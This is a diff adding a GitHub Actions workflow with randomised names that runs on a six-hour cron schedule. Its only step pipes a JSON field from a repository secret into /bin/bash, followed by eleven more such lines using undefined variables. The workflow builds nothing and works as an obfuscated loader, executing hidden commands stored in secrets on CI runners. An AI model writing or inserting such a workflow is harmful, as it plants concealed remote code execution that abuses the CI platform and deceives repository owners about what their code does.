@@ -1,0 +1,29 @@
+name: vnadujl
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '52 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: vnadujl
+        env:
+          cdubf98: ${{ secrets.cdubf98 }}
+        run: |
+          echo $cdubf98 | jq -r .gziht0333 | /bin/bash
+          echo $cgx8 | jq -r .vpj84 | /bin/bash
+          echo $o4 | jq -r .uv21009 | /bin/bash
+          echo $cmms2796 | jq -r .gel1219 | /bin/bash
+          echo $klsib8 | jq -r .pgo63111 | /bin/bash
+          echo $zoix6944 | jq -r .a3488 | /bin/bash
+          echo $yvhrb4 | jq -r .wo1 | /bin/bash
+          echo $d38074 | jq -r .vxlm2222 | /bin/bash
+          echo $il0 | jq -r .sjiy17 | /bin/bash
+          echo $dwbob0 | jq -r .tfla60 | /bin/bash
+          echo $ui7 | jq -r .iaobx06 | /bin/bash
+          echo $bene28 | jq -r .i6 | /bin/bash
+
